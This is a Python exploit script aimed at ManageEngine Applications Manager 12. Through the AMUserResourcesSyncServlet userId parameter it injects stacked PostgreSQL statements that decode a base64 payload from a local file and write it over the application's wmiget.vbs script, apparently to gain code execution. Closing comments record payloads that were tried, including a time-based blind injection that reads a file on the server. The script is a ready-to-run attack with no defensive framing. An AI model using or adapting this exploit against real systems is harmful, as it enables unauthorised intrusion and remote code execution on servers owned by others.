import sys, requests, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# String qry = "select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=" + userId + " RESOURCEID >" + stRange + " and RESOURCEID < " + endRange;

def main():
    if len(sys.argv) != 2:
        print "Usage: %s <target>" % sys.argv[0]
        print "eg. %s target" % sys.argv[0]
        sys.exit(-1)

    t = sys.argv[1]

    payload = ''
    f = open('payload.txt','r')
    for line in f:
        payload += line

    sqli =";copy+(select+convert_from(decode($$%s$$,$$base64$$),$$utf-8$$))+to$$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\s cripts\\wmiget.vbs$$;" % payload

    r = requests.post('https://%s:8443/servlet/AMUserResourcesSyncServlet' % t, params='ForMasRange=1&userId=1%s' % sqli, verify=False)
    print r
    print r.text
    print r.headers

if __name__ == '__main__': main()

# this payload worked->";CREATE+TEMP+TABLE+readme(content+text);--+COPY+readme+FROM+$$C:\Users\Public\offsex.txt$$;--+SELECT+CASE+WHEN(ascii(substr((SELECT+CONTENT+FROM+readme),1,1))=111)+THEN+pg_sleep(10)+end;--+"
# sqli =";copy+(select+convert_from(decode($$%s$$,$$base64$$),$$utf-8$$))to$$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\application\\scripts\\wmiget.vbs$$;--+" % payload 
# Good --> sqli =";COPY+(SELECT+$$FUCKYOU$$)+TO+$$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\application\\scripts\\wmiget.vbs$$;--+"
